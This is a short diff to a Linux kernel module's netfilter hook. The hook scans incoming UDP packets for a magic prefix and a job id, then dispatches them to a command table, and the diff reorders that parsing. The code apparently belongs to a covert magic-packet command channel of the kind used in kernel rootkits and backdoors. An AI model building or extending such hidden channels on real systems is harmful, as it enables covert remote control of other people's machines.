@@ -272,21 +272,17 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
 
     user_data_len = get_udp_user_data(skb, &user_data);
 
-    printk(KERN_INFO "job id - %d\n", get_unaligned((job_id_t *)user_data));
-    if (get_open_stream(get_unaligned((job_id_t *)user_data))) {
-        job_id = get_unaligned((job_id_t *)user_data);
-        user_data += sizeof(job_id_t);
-        user_data_len -= sizeof(job_id_t);
-        cmd = cmds + 5;
+    if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
+    user_data += CMD_MAGIC_LEN;
+    user_data_len -= CMD_MAGIC_LEN;
+
+    job_id = get_unaligned((job_id_t *)user_data);
+    user_data += sizeof(job_id_t);
+    user_data_len -= sizeof(job_id_t);
+    
+    if (get_open_stream(job_id)) {
+        cmd = &cmds[5];
     } else {
-        if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
-        user_data += CMD_MAGIC_LEN;
-        user_data_len -= CMD_MAGIC_LEN;
-
-        job_id = get_unaligned((job_id_t *)user_data);
-        user_data += sizeof(job_id_t);
-        user_data_len -= sizeof(job_id_t);
-
         cmd = match_buffer_to_cmd_type(user_data);
         if (cmd == NULL) return NF_ACCEPT;
         user_data += strlen(cmd->name);
